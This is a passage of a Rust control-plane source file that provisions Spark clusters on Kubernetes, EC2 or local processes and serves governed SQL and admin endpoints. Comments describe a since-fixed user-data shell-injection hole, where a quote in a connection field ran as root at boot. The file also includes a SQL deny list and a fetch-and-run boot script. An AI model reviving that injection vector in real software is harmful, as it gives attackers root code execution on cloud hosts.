async fn logout() -> StatusCode {
    // Stateless JWT: the client discards the token. (A denylist lands with the persistent store.)
    StatusCode::NO_CONTENT
}

/// The current principal, from the validated token.
async fn me(Extension(claims): Extension<Claims>) -> Json<serde_json::Value> {
    Json(serde_json::json!({
        "user": claims.sub,
        "groups": claims.groups,
        "authenticated": true
    }))
}

async fn list_clusters(State(st): State<AppState>) -> Json<Vec<Cluster>> {
    let mut v: Vec<Cluster> = st.clusters.lock().unwrap().values().cloned().collect();
    v.sort_by(|a, b| a.id.cmp(&b.id));
    Json(v)
}

async fn create_cluster(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Json(body): Json<CreateCluster>,
) -> Result<(StatusCode, Json<Cluster>), StatusCode> {
    oidc::require_admin(&claims).map_err(|(c, _)| c)?;
    let id = st.new_id();
    let cluster = Cluster {
        id: id.clone(),
        name: body.name,
        state: Phase::Pending.as_str().to_string(),
        worker_min: body.worker_min,
        worker_max: body.worker_max,
        worker_size: body.worker_size,
        connect_endpoint: None,
        instance_id: None,
    };
    st.clusters
        .lock()
        .unwrap()
        .insert(id.clone(), cluster.clone());
    st.save_clusters();
    st.add_event(
        &id,
        format!(
            "Cluster created (requested {} worker(s))",
            cluster.worker_min
        ),
    );
    // Provision a real compute backend (Databricks-style: create implies start). Async so the API
    // returns immediately while the cluster comes up — poll the list / events to watch it advance.
    st.touch(&id);
    tokio::spawn(provision(st.clone(), id));
    Ok((StatusCode::CREATED, Json(cluster)))
}

/// Build the `WEFT_CATALOG_CONF` value (`;`-separated `spark.sql.catalog.<name>.*` entries) from the
/// attached connections, so a freshly provisioned cluster registers the same catalogs as the
/// control plane. Glue → `type=glue;region=…`; Hive → `type=hive;uri=…`.
fn cluster_catalog_conf(st: &AppState, default_region: &str) -> String {
    let conns = st.connections.lock().unwrap();
    let mut parts: Vec<String> = Vec::new();
    for c in conns.iter() {
        let p = format!("spark.sql.catalog.{}", c.name);
        parts.push(format!("{p}.type={}", c.kind));
        match c.kind.as_str() {
            "glue" => {
                let region = c
                    .options
                    .get("region")
                    .map(String::as_str)
                    .unwrap_or(default_region);
                parts.push(format!("{p}.region={region}"));
            }
            "hive" => {
                if let Some(uri) = c.options.get("uri") {
                    parts.push(format!("{p}.uri={uri}"));
                }
            }
            _ => {}
        }
    }
    parts.join(";")
}

/// Render the EC2 boot script. The operator-controlled `weft_url`/`region` are interpolated directly;
/// the attached-catalog config — the only attacker-influenced input — is carried as **inert base64**
/// and decoded into the env var at runtime via a quoted command substitution, so the shell never
/// re-parses its contents. This removes the user-data injection RCE entirely: even a connection field
/// that slipped past validation (e.g. a single-quote breakout) is just opaque bytes here, never a
/// shell literal. (Previously `WEFT_CATALOG_CONF='{catalog_conf}'` let a `'` in a connection uri/name
/// break out and run as root at boot on an IAM-instance-profile box.)
fn ec2_user_data(weft_url: &str, region: &str, catalog_conf: &str) -> String {
    let catalog_b64 = base64_encode(catalog_conf.as_bytes());
    format!(
        "#!/bin/bash\nset -e\n\
         curl -fsSL '{weft_url}' -o /usr/local/bin/weft\nchmod +x /usr/local/bin/weft\n\
         export AWS_REGION='{region}'\n\
         export WEFT_CATALOG_CONF=\"$(printf %s '{catalog_b64}' | base64 -d)\"\n\
         /usr/local/bin/weft spark server --port 50051 > /var/log/weft.log 2>&1 &\n"
    )
}

/// Whether the Kubernetes orchestrator backend is selected (`WEFT_ORCHESTRATOR=k8s`).
fn orchestrator_is_k8s() -> bool {
    std::env::var("WEFT_ORCHESTRATOR").as_deref() == Ok("k8s")
}

/// Materialize a cluster into real compute and advance its state. The backend is selected at runtime:
/// `k8s` applies hardened pod manifests via the orchestrator (no shell), otherwise a real EC2 instance
/// (when configured) or a local `weft spark server` process for dev — same lifecycle states.
async fn provision(st: AppState, id: String) {
    st.set_state(&id, Phase::Provisioning, None);
    if orchestrator_is_k8s() {
        provision_k8s(st, id).await;
    } else if st.ec2.as_ref().is_some() {
        provision_ec2(st, id).await;
    } else {
        provision_process(st, id).await;
    }
}

/// Map a `worker_size` class to per-pod CPU/memory.
fn pod_resources_for(size: &str) -> (String, String) {
    match size {
        "small" => ("1".into(), "2Gi".into()),
        "medium" => ("2".into(), "4Gi".into()),
        "large" => ("4".into(), "8Gi".into()),
        "xlarge" => ("8".into(), "16Gi".into()),
        _ => ("1".into(), "2Gi".into()),
    }
}

/// The attached-catalog config as typed `(key, value)` pairs (the inert form the orchestrator
/// serializes into a ConfigMap value — never a shell token).
fn cluster_catalog_pairs(st: &AppState, default_region: &str) -> Vec<(String, String)> {
    let conns = st.connections.lock().unwrap();
    let mut pairs = Vec::new();
    for c in conns.iter() {
        let p = format!("spark.sql.catalog.{}", c.name);
        pairs.push((format!("{p}.type"), c.kind.clone()));
        match c.kind.as_str() {
            "glue" => {
                let region = c
                    .options
                    .get("region")
                    .map(String::as_str)
                    .unwrap_or(default_region);
                pairs.push((format!("{p}.region"), region.to_string()));
            }
            "hive" => {
                if let Some(uri) = c.options.get("uri") {
                    pairs.push((format!("{p}.uri"), uri.clone()));
                }
            }
            _ => {}
        }
    }
    pairs
}

/// Provision a cluster as hardened Kubernetes pods via the orchestrator. The driver/worker images,
/// region, IRSA role, egress allowlist, and CSI secret class come from operator config (env), never
/// a request body; the catalog config is passed as inert typed pairs.
async fn provision_k8s(st: AppState, id: String) {
    use weft_orchestrator::{ClusterBackend, ClusterSpec, K8sBackend};
    let region = std::env::var("AWS_REGION").unwrap_or_else(|_| "us-west-2".into());
    let (size, worker_min, worker_max) = {
        let clusters = st.clusters.lock().unwrap();
        clusters
            .get(&id)
            .map(|c| (c.worker_size.clone(), c.worker_min, c.worker_max))
            .unwrap_or_else(|| ("small".into(), 1, 1))
    };
    let (cpu, memory) = pod_resources_for(&size);
    let image =
        std::env::var("WEFT_CLUSTER_IMAGE").unwrap_or_else(|_| "weft/connect-server:latest".into());
    let worker_image = std::env::var("WEFT_WORKER_IMAGE").unwrap_or_else(|_| image.clone());
    // IRSA role ARN is derived server-side from an operator prefix + the cluster id, so a request can
    // never bind another tenant's identity.
    let iam_role_arn = std::env::var("WEFT_CLUSTER_IRSA_ROLE_PREFIX")
        .ok()
        .map(|p| format!("{p}{id}"));
    let egress_cidrs = std::env::var("WEFT_CLUSTER_EGRESS_CIDRS")
        .ok()
        .map(|s| {
            s.split(',')
                .map(|x| x.trim().to_string())
                .filter(|x| !x.is_empty())
                .collect()
        })
        .unwrap_or_default();
    let spec = ClusterSpec {
        id: id.clone(),
        image,
        worker_image,
        region: region.clone(),
        port: 50051,
        worker_min,
        worker_max,
        cpu,
        memory,
        service_account: format!("weft-cl-{id}"),
        iam_role_arn,
        catalog_conf: cluster_catalog_pairs(&st, &region),
        secret_provider_class: std::env::var("WEFT_CLUSTER_SECRET_CLASS").ok(),
        egress_cidrs,
    };
    st.add_event(
        &id,
        "Applying Kubernetes manifests (namespace, hardened pods, NetworkPolicy, IRSA)",
    );
    match K8sBackend::from_env().provision(&spec).await {
        Ok(()) => {
            // The driver's readiness probe gates real traffic; a production reconcile loop would gate
            // the RUNNING transition on EndpointSlice readiness. The endpoint is stable Service DNS.
            let endpoint = spec.endpoint();
            st.set_state(&id, Phase::Running, Some(endpoint.clone()));
            st.add_event(&id, format!("Cluster RUNNING — Spark Connect endpoint {endpoint}"));
        }
        Err(e) => {
            st.set_state(&id, Phase::Error, None);
            st.add_event(&id, format!("Kubernetes provisioning failed: {e}"));
        }
    }
}

/// Launch a real EC2 instance running `weft spark server` for this cluster.
async fn provision_ec2(st: AppState, id: String) {
    use tokio::net::TcpStream;
    use tokio::time::{sleep, Duration};
    let cfg = st.ec2.as_ref().clone().expect("ec2 config");

    let size = st
        .clusters
        .lock()
        .unwrap()
        .get(&id)
        .map(|c| c.worker_size.clone())
        .unwrap_or_else(|| "small".into());
    let itype = instance_type_for(&size);
    st.add_event(
        &id,
        format!("Launching EC2 instance ({itype}) for cluster compute"),
    );

    // Propagate every attached catalog connection so the cluster's engine registers them too —
    // a cluster automatically "sees" the same catalogs as the control plane.
    let catalog_conf = cluster_catalog_conf(&st, &cfg.region);
    if !catalog_conf.is_empty() {
        st.add_event(
            &id,
            format!(
                "Seeding cluster with {} attached catalog(s)",
                st.connections.lock().unwrap().len()
            ),
        );
    }

    // user-data: download the weft binary and run the Spark Connect server on boot, with AWS region
    // + catalog config in the environment so external catalogs (Glue/Hive) resolve on the cluster.
    // Catalog conf is carried as inert base64 (see `ec2_user_data`) — never interpolated as a shell
    // literal.
    let user_data = ec2_user_data(&cfg.weft_url, &cfg.region, &catalog_conf);
    let user_data_b64 = base64_encode(user_data.as_bytes());

    let mut args: Vec<String> = vec![
        "ec2".into(), "run-instances".into(),
        "--image-id".into(), cfg.ami.clone(),
        "--instance-type".into(), itype.to_string(),
        "--security-group-ids".into(), cfg.sg.clone(),
        "--user-data".into(), user_data_b64,
        "--tag-specifications".into(),
        format!("ResourceType=instance,Tags=[{{Key=Name,Value=weft-cluster-{id}}},{{Key=project,Value=weft-cluster}}]"),
        "--region".into(), cfg.region.clone(),
        "--query".into(), "Instances[0].InstanceId".into(),
        "--output".into(), "text".into(),
    ];
    if let Some(subnet) = &cfg.subnet {
        args.push("--subnet-id".into());
        args.push(subnet.clone());
    }
    if let Some(key) = &cfg.key {
        args.push("--key-name".into());
        args.push(key.clone());
    }
    if let Some(profile) = &cfg.instance_profile {
        // Lets the cluster read Glue/S3 via the instance role (no static keys).
        args.push("--iam-instance-profile".into());
        args.push(format!("Name={profile}"));
    }
    // Private clusters get no public IP — the in-VPC gateway reaches them by private IP.
    args.push("--associate-public-ip-address".into());
    if cfg.private {
        args.last_mut()
            .map(|s| *s = "--no-associate-public-ip-address".into());
    }

    let instance_id = match run_aws(&cfg.aws_bin, &args).await {
        Ok(out) => out.trim().to_string(),
        Err(e) => {
            st.set_state(&id, Phase::Error, None);
            st.add_event(&id, format!("Failed to launch EC2 instance: {e}"));
            return;
        }
    };
    st.runtimes.lock().await.insert(
        id.clone(),
        ClusterRuntime::Ec2 {
            instance_id: instance_id.clone(),
        },
    );
    // Persist the instance id so the cluster can be re-adopted (deleted/auto-terminated) if the
    // control plane restarts before the instance is torn down.
    st.set_cluster_instance(&id, &instance_id);
    st.add_event(
        &id,
        format!("EC2 instance {instance_id} launching; waiting for it to boot"),
    );

    // Wait for the instance's IP (private when running in a private subnet, else public) — ~120s.
    let ip_field = if cfg.private {
        "Reservations[0].Instances[0].PrivateIpAddress"
    } else {
        "Reservations[0].Instances[0].PublicIpAddress"
    };
    let mut ip = None;
    for _ in 0..60 {
        if let Ok(out) = run_aws(
            &cfg.aws_bin,
            &[
                "ec2".into(),
                "describe-instances".into(),
                "--instance-ids".into(),
                instance_id.clone(),
                "--region".into(),
                cfg.region.clone(),
                "--query".into(),
                ip_field.into(),
                "--output".into(),
                "text".into(),
            ],
        )
        .await
        {
            let v = out.trim();
            if !v.is_empty() && v != "None" {
                ip = Some(v.to_string());
                break;
            }
        }
        sleep(Duration::from_secs(2)).await;
    }
    let Some(ip) = ip else {
        st.set_state(&id, Phase::Error, None);
        st.add_event(&id, "EC2 instance did not report an IP in time");
        return;
    };
    st.add_event(&id, format!("Instance running at {ip}; waiting for Spark Connect to accept (booting + installing weft)"));

    // Wait for the Spark Connect port to accept — the instance boots, downloads weft, and starts
    // the server (up to ~3 min).
    let mut up = false;
    for _ in 0..90 {
        if TcpStream::connect((ip.as_str(), 50051)).await.is_ok() {
            up = true;
            break;
        }
        sleep(Duration::from_secs(2)).await;
    }
    if up {
        let endpoint = format!("sc://{ip}:50051");
        st.set_state(&id, Phase::Running, Some(endpoint.clone()));
        st.add_event(
            &id,
            format!("Cluster RUNNING on EC2 {instance_id} — Spark Connect endpoint {endpoint}"),
        );
    } else {
        st.set_state(&id, Phase::Error, None);
        st.add_event(
            &id,
            "Spark Connect did not come up on the EC2 instance in time",
        );
    }
}

/// Fallback: run `weft spark server` as a local process (no EC2 config).
async fn provision_process(st: AppState, id: String) {
    use tokio::net::TcpStream;
    use tokio::time::{sleep, Duration};

    let port = st.alloc_port();
    st.add_event(
        &id,
        format!("Provisioning compute (local process, Spark Connect port {port})"),
    );
    if st.weft_bin.is_empty() {
        st.set_state(&id, Phase::Error, None);
        st.add_event(
            &id,
            "No weft binary configured (WEFT_BIN) — cannot start compute",
        );
        return;
    }
    let child = tokio::process::Command::new(st.weft_bin.as_str())
        .args(["spark", "server", "--port", &port.to_string()])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn();
    let child = match child {
        Ok(c) => c,
        Err(e) => {
            st.set_state(&id, Phase::Error, None);
            st.add_event(&id, format!("Failed to launch compute: {e}"));
            return;
        }
    };
    st.runtimes
        .lock()
        .await
        .insert(id.clone(), ClusterRuntime::Process(child));
    st.add_event(
        &id,
        "Compute process launched; waiting for the Spark Connect endpoint to accept",
    );
    let mut up = false;
    for _ in 0..40 {
        if TcpStream::connect(("127.0.0.1", port)).await.is_ok() {
            up = true;
            break;
        }
        sleep(Duration::from_millis(500)).await;
    }
    if up {
        let endpoint = format!("sc://{}:{port}", st.public_host);
        st.set_state(&id, Phase::Running, Some(endpoint.clone()));
        st.add_event(
            &id,
            format!("Cluster RUNNING — Spark Connect endpoint {endpoint}"),
        );
    } else {
        st.set_state(&id, Phase::Error, None);
        st.add_event(&id, "Compute did not become ready in time");
    }
}

/// Run an `aws` CLI command, returning stdout on success.
async fn run_aws(aws_bin: &str, args: &[String]) -> Result<String, String> {
    let out = tokio::process::Command::new(aws_bin)
        .args(args)
        .output()
        .await
        .map_err(|e| format!("exec aws: {e}"))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

/// Minimal base64 (standard alphabet) for the EC2 user-data payload.
fn base64_encode(input: &[u8]) -> String {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity((input.len() + 2) / 3 * 4);
    for chunk in input.chunks(3) {
        let b = [
            chunk[0],
            *chunk.get(1).unwrap_or(&0),
            *chunk.get(2).unwrap_or(&0),
        ];
        let n = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | (b[2] as u32);
        out.push(ALPHABET[((n >> 18) & 63) as usize] as char);
        out.push(ALPHABET[((n >> 12) & 63) as usize] as char);
        out.push(if chunk.len() > 1 {
            ALPHABET[((n >> 6) & 63) as usize] as char
        } else {
            '='
        });
        out.push(if chunk.len() > 2 {
            ALPHABET[(n & 63) as usize] as char
        } else {
            '='
        });
    }
    out
}

async fn get_cluster(
    State(st): State<AppState>,
    Path(id): Path<String>,
) -> Result<Json<Cluster>, StatusCode> {
    st.clusters
        .lock()
        .unwrap()
        .get(&id)
        .cloned()
        .map(Json)
        .ok_or(StatusCode::NOT_FOUND)
}

/// The lifecycle events for a cluster (the reconcile trace shown in the UI).
async fn list_cluster_events(
    State(st): State<AppState>,
    Path(id): Path<String>,
) -> Json<Vec<ClusterEvent>> {
    Json(
        st.events
            .lock()
            .unwrap()
            .get(&id)
            .cloned()
            .unwrap_or_default(),
    )
}

async fn delete_cluster(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Path(id): Path<String>,
) -> StatusCode {
    if oidc::require_admin(&claims).is_err() {
        return StatusCode::FORBIDDEN;
    }
    let existed = st.clusters.lock().unwrap().remove(&id).is_some();
    if !existed {
        return StatusCode::NOT_FOUND;
    }
    kill_runtime(&st, &id).await;
    st.events.lock().unwrap().remove(&id);
    st.save_clusters();
    StatusCode::NO_CONTENT
}

async fn start_cluster(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Path(id): Path<String>,
) -> Result<Json<Cluster>, StatusCode> {
    oidc::require_admin(&claims).map_err(|(c, _)| c)?;
    let exists = st.clusters.lock().unwrap().contains_key(&id);
    if !exists {
        return Err(StatusCode::NOT_FOUND);
    }
    st.touch(&id);
    let already_up = st.runtimes.lock().await.contains_key(&id);
    if !already_up {
        st.add_event(&id, "Start requested");
        tokio::spawn(provision(st.clone(), id.clone()));
    }
    st.clusters
        .lock()
        .unwrap()
        .get(&id)
        .cloned()
        .map(Json)
        .ok_or(StatusCode::NOT_FOUND)
}

async fn stop_cluster(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Path(id): Path<String>,
) -> Result<Json<Cluster>, StatusCode> {
    oidc::require_admin(&claims).map_err(|(c, _)| c)?;
    let exists = st.clusters.lock().unwrap().contains_key(&id);
    if !exists {
        return Err(StatusCode::NOT_FOUND);
    }
    kill_runtime(&st, &id).await;
    st.set_state(&id, Phase::Terminated, None);
    st.add_event(&id, "Cluster stopped (compute terminated)");
    st.clusters
        .lock()
        .unwrap()
        .get(&id)
        .cloned()
        .map(Json)
        .ok_or(StatusCode::NOT_FOUND)
}

/// Tear down the compute backing a cluster. Under the Kubernetes backend this deletes the cluster's
/// namespace (cascade-GCs the workload); it also removes any local process / EC2 runtime handle.
async fn kill_runtime(st: &AppState, id: &str) {
    if orchestrator_is_k8s() {
        use weft_orchestrator::ClusterBackend;
        if let Err(e) = weft_orchestrator::K8sBackend::from_env().terminate(id).await {
            st.add_event(id, format!("Kubernetes teardown error: {e}"));
        }
    }
    let rt = st.runtimes.lock().await.remove(id);
    match rt {
        Some(ClusterRuntime::Process(mut child)) => {
            let _ = child.kill().await;
        }
        Some(ClusterRuntime::Ec2 { instance_id }) => {
            if let Some(cfg) = st.ec2.as_ref().as_ref() {
                let _ = run_aws(
                    &cfg.aws_bin,
                    &[
                        "ec2".into(),
                        "terminate-instances".into(),
                        "--instance-ids".into(),
                        instance_id,
                        "--region".into(),
                        cfg.region.clone(),
                        "--output".into(),
                        "text".into(),
                    ],
                )
                .await;
            }
        }
        None => {}
    }
}

// ───────────────────────────────────────── Run SQL ──────────────────────────────────────────────

/// `POST /api/sql` body.
#[derive(Debug, Deserialize)]
pub struct SqlRequest {
    /// The SQL to run (Spark dialect; passed through the dialect shim).
    pub sql: String,
    /// Optional target cluster (ignored by the embedded engine; the routing seam).
    #[serde(default)]
    pub cluster_id: Option<String>,
}

/// `POST /api/sql` response — a column header + rows of display strings (capped for the UI).
#[derive(Debug, Serialize)]
pub struct SqlResponse {
    /// Column names.
    pub columns: Vec<String>,
    /// Up to 1000 result rows, each a vector of stringified cell values.
    pub rows: Vec<Vec<String>>,
    /// Total rows produced (before the UI cap).
    pub row_count: usize,
    /// Error message if the query failed (then `rows` is empty).
    pub error: Option<String>,
}

/// An error-only [`SqlResponse`] (empty result + message), used for governance denials and failures.
fn sql_error(msg: impl Into<String>) -> SqlResponse {
    SqlResponse {
        columns: vec![],
        rows: vec![],
        row_count: 0,
        error: Some(msg.into()),
    }
}

/// Conservatively deny SQL that reads files directly (bypassing catalog governance) for governed
/// (non-admin) sessions: file-scan table functions, `CREATE EXTERNAL TABLE … LOCATION`, and `COPY`.
/// These have no securable to gate and would otherwise read raw object storage with the engine's
/// credentials. Defense-in-depth on top of table-reference authorization; over-denial is acceptable
/// (safe). The input is the translated SQL.
fn forbidden_construct(sql: &str) -> Option<&'static str> {
    let s = sql.to_ascii_lowercase();
    for f in ["read_parquet", "read_csv", "read_json", "read_avro", "read_ndjson"] {
        if s.contains(&format!("{f}(")) || s.contains(&format!("{f} (")) {
            return Some("file-scan table functions are not permitted");
        }
    }
    if s.contains("create external table") {
        return Some("CREATE EXTERNAL TABLE is not permitted");
    }
    if s.contains("copy ") && (s.contains(" to ") || s.contains(" from ")) {
        return Some("COPY is not permitted");
    }
    None
}

/// A stable, per-principal+cluster Spark Connect session id. Replaces a single hardcoded id shared
/// by every user (which collided sessions / temp views / caches across principals). Deterministic
/// across gateway restarts (so a user keeps their session) and distinct per (user, cluster). FNV-1a
/// avoids a new dependency; the id is opaque to Spark Connect, formatted UUID-shaped for familiarity.
fn session_id_for(user: &str, cluster: &str) -> String {
    fn fnv1a(seed: u64, data: &[u8]) -> u64 {
        let mut h = seed;
        for &b in data {
            h ^= b as u64;
            h = h.wrapping_mul(0x0000_0100_0000_01b3);
        }
        h
    }
    let key = format!("{user}\u{0}{cluster}");
    let lo = fnv1a(0xcbf2_9ce4_8422_2325, key.as_bytes());
    let hi = fnv1a(0x8422_2325_cbf2_9ce4, key.as_bytes());
    format!(
        "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
        (hi >> 32) as u32,
        (hi >> 16) as u16,
        hi as u16,
        (lo >> 48) as u16,
        lo & 0xffff_ffff_ffff,
    )
}

/// Walk a resolved (optimized) logical plan and return the first table reference the `identity` may
/// not `SELECT`. References in the session-scratch default catalog (temp views / ad-hoc registered
/// tables) are skipped — any governed data they could expose is itself read through a governed
/// `TableScan` elsewhere in the same plan. Using the optimized plan decorrelates subqueries so their
/// base scans surface as plan nodes. This is gateway-side *defense-in-depth*; resolution oddities
/// fail closed.
fn first_unauthorized_table(
    eval: &Evaluator,
    identity: &Identity,
    default_catalog: &str,
    default_schema: &str,
    plan: &datafusion::logical_expr::LogicalPlan,
) -> Option<String> {
    use datafusion::common::tree_node::{TreeNode, TreeNodeRecursion};
    use datafusion::logical_expr::LogicalPlan;
    let mut denied: Option<String> = None;
    let _ = plan.apply(|node| {
        if let LogicalPlan::TableScan(scan) = node {
            let r = scan
                .table_name
                .clone()
                .resolve(default_catalog, default_schema);
            // Govern only named catalogs; the default catalog is session scratch.
            if r.catalog.as_ref() != default_catalog {
                let securable =
                    Securable::table(r.catalog.as_ref(), r.schema.as_ref(), r.table.as_ref());
                if !eval.can(identity, Privilege::Select, &securable) {
                    denied = Some(format!("{}.{}.{}", r.catalog, r.schema, r.table));
                    return Ok(TreeNodeRecursion::Stop);
                }
            }
        }
        Ok(TreeNodeRecursion::Continue)
    });
    denied
}

/// Run a SQL query and return rows, enforced for the caller's identity. Spark-dialect input is passed
/// through [`weft_sql::dialect`] first. A selected RUNNING cluster routes execution to its Spark
/// Connect endpoint (the real data-plane hop); otherwise it runs on the gateway's governed embedded
/// engine. Governed (non-admin) sessions are authorized against the resolved plan's table scans and
/// denied direct file reads; cluster routing is fail-closed for non-admins until engine-side
/// enforcement lands.
async fn run_sql(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Json(req): Json<SqlRequest>,
) -> Json<SqlResponse> {
    const MAX_ROWS: usize = 1000;
    let is_admin = st.is_admin(&claims.sub);
    // If a RUNNING cluster is selected, route execution to its Spark Connect endpoint (the real
    // data-plane hop); otherwise run on the gateway's embedded engine. A non-running selection
    // falls back to the embedded engine.
    if let Some(cid) = req.cluster_id.as_deref().filter(|s| !s.is_empty()) {
        st.touch(cid); // counts as activity → resets the cluster's idle timer
        let endpoint = {
            let clusters = st.clusters.lock().unwrap();
            clusters.get(cid).and_then(|c| {
                if c.state == Phase::Running.as_str() {
                    c.connect_endpoint.clone()
                } else {
                    None
                }
            })
        };
        if let Some(ep) = endpoint {
            // SECURITY: cluster-routed SQL bypasses the governed embedded engine and reaches a Spark
            // Connect server that does not yet enforce per-identity governance. Until then, routing
            // is restricted to admins; non-admins fall back to the governed embedded engine below.
            if !is_admin {
                return Json(sql_error(
                    "cluster-routed queries are temporarily restricted to admins \
                     (engine-side governance enforcement pending)",
                ));
            }
            let session = session_id_for(&claims.sub, cid);
            return match cluster_client::run_sql_on_cluster(&ep, &session, &req.sql, MAX_ROWS).await
            {
                Ok(batches) => Json(batches_to_response(&batches)),
                Err(e) => Json(sql_error(format!("cluster `{cid}`: {e}"))),
            };
        }
    }
    let sql = weft_sql::dialect::to_datafusion_sql(&req.sql);
    // Governed (non-admin) sessions: deny direct file reads, then authorize every table the resolved
    // plan scans. Admins own the metastore, so they are authorized by construction and skip the walk.
    if !is_admin {
        if let Some(reason) = forbidden_construct(&sql) {
            return Json(sql_error(reason));
        }
    }
    // Cap execution at the UI display limit so an unbounded `SELECT *` over a huge external table
    // (e.g. 100M-row ClickBench `hits`) reads only enough row groups instead of materializing the
    // whole result into memory (which previously OOMed → "load failed"). LIMIT pushes into the scan.
    let df = match st.engine.ctx().sql(&sql).await {
        Ok(df) => df,
        Err(e) => return Json(sql_error(format!("{e}"))),
    };
    if !is_admin {
        let plan = match df.clone().into_optimized_plan() {
            Ok(p) => p,
            Err(e) => return Json(sql_error(format!("{e}"))),
        };
        let identity = crate::authz::identity_of(&st, &claims);
        let evaluator = st.evaluator();
        let state = st.engine.ctx().state();
        let cat = &state.config().options().catalog;
        if let Some(denied) = first_unauthorized_table(
            &evaluator,
            &identity,
            &cat.default_catalog,
            &cat.default_schema,
            &plan,
        ) {
            return Json(sql_error(format!(
                "permission denied: no SELECT privilege on {denied}"
            )));
        }
    }
    let result = async {
        let df = df.limit(0, Some(MAX_ROWS))?;
        df.collect().await
    }
    .await;
    match result {
        Ok(batches) => Json(batches_to_response(&batches)),
        Err(e) => Json(sql_error(format!("{e}"))),
    }
}

fn batches_to_response(batches: &[weft_loom::arrow::record_batch::RecordBatch]) -> SqlResponse {
    let Some(first) = batches.first() else {
        return SqlResponse {
            columns: vec![],
            rows: vec![],
            row_count: 0,
            error: None,
        };
    };
    let columns: Vec<String> = first
        .schema()
        .fields()
        .iter()
        .map(|f| f.name().clone())
        .collect();
    let opts = FormatOptions::default();
    let mut rows: Vec<Vec<String>> = Vec::new();
    for b in batches {
        let Ok(fmts) = b
            .columns()
            .iter()
            .map(|c| ArrayFormatter::try_new(c, &opts))
            .collect::<Result<Vec<_>, _>>()
        else {
            continue;
        };
        for r in 0..b.num_rows() {
            rows.push(fmts.iter().map(|f| f.value(r).to_string()).collect());
        }
    }
    let row_count = rows.len();
    rows.truncate(1000); // cap for the UI grid
    SqlResponse {
        columns,
        rows,
        row_count,
        error: None,
    }
}

// ──────────────────────────────── Admin: users / groups / grants ────────────────────────────────

/// A user as the admin panel lists it.
#[derive(Debug, Serialize)]
pub struct UserDto {
    /// Username.
    pub username: String,
    /// Group memberships.
    pub groups: Vec<String>,
}

/// `POST /api/admin/users` body.
#[derive(Debug, Deserialize)]
pub struct CreateUser {
    /// Username.
    pub username: String,
    /// Password (bcrypt-hashed on store).
    pub password: String,
    /// Initial group memberships.
    #[serde(default)]
    pub groups: Vec<String>,
}

async fn list_users(State(st): State<AppState>) -> Json<Vec<UserDto>> {
    let users = st.users.lock().unwrap();
    let mut out: Vec<UserDto> = users
        .iter()
        .map(|(u, r)| UserDto {
            username: u.clone(),
            groups: r.groups.clone(),
        })
        .collect();
    out.sort_by(|a, b| a.username.cmp(&b.username));
    Json(out)
}

async fn create_user(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Json(b): Json<CreateUser>,
) -> Result<StatusCode, (StatusCode, String)> {
    oidc::require_admin(&claims)?;
    let hash = match bcrypt::hash(&b.password, bcrypt::DEFAULT_COST) {
        Ok(h) => h,
        Err(_) => return Ok(StatusCode::INTERNAL_SERVER_ERROR),
    };
    st.users.lock().unwrap().insert(
        b.username.clone(),
        UserRecord {
            password_hash: hash,
            groups: b.groups.clone(),
        },
    );
    // Reflect membership in the group store.
    let mut groups = st.groups.lock().unwrap();
    for g in &b.groups {
        groups
            .entry(g.clone())
            .or_default()
            .push(b.username.clone());
    }
    Ok(StatusCode::CREATED)
}

/// A group as the admin panel lists it.
#[derive(Debug, Serialize)]
pub struct GroupDto {
    /// Group name.
    pub name: String,
    /// Member usernames (and nested group names).
    pub members: Vec<String>,
}

/// `POST /api/admin/groups` body.
#[derive(Debug, Deserialize)]
pub struct CreateGroup {
    /// Group name.
    pub name: String,
    /// Initial members.
    #[serde(default)]
    pub members: Vec<String>,
}

async fn list_groups(State(st): State<AppState>) -> Json<Vec<GroupDto>> {
    let groups = st.groups.lock().unwrap();
    let mut out: Vec<GroupDto> = groups
        .iter()
        .map(|(n, m)| GroupDto {
            name: n.clone(),
            members: m.clone(),
        })
        .collect();
    out.sort_by(|a, b| a.name.cmp(&b.name));
    Json(out)
}

async fn create_group(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Json(b): Json<CreateGroup>,
) -> Result<StatusCode, (StatusCode, String)> {
    oidc::require_admin(&claims)?;
    st.groups.lock().unwrap().insert(b.name, b.members);
    Ok(StatusCode::CREATED)
}

/// A grant as the admin panel exchanges it (Unity-Catalog model, string-typed for the wire).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GrantDto {
    /// Securable type: `catalog`/`schema`/`table`/`view`/`metastore`/…
    pub securable_type: String,
    /// Dotted securable name (e.g. `main.sales.orders`; empty for the metastore).
    pub securable_name: String,
    /// Privilege: `SELECT`/`MODIFY`/`USE CATALOG`/`ALL PRIVILEGES`/`BROWSE`/…
    pub privilege: String,
    /// Principal kind: `user`/`group`/`service_principal`.
    pub principal_kind: String,
    /// Principal id (username / group name).
    pub principal_id: String,
    /// `allow` or `deny`.
    pub effect: String,
}

async fn list_grants(State(st): State<AppState>) -> Json<Vec<GrantDto>> {
    Json(st.grants.lock().unwrap().iter().map(grant_to_dto).collect())
}

async fn create_grant(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Json(d): Json<GrantDto>,
) -> Result<StatusCode, (StatusCode, String)> {
    oidc::require_admin(&claims)?;
    let grant = dto_to_grant(&d).map_err(|e| (StatusCode::BAD_REQUEST, e))?;
    let mut grants = st.grants.lock().unwrap();
    if !grants.contains(&grant) {
        grants.push(grant);
    }
    Ok(StatusCode::CREATED)
}

async fn revoke_grant(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Json(d): Json<GrantDto>,
) -> Result<StatusCode, (StatusCode, String)> {
    oidc::require_admin(&claims)?;
    match dto_to_grant(&d) {
        Ok(g) => {
            st.grants.lock().unwrap().retain(|x| x != &g);
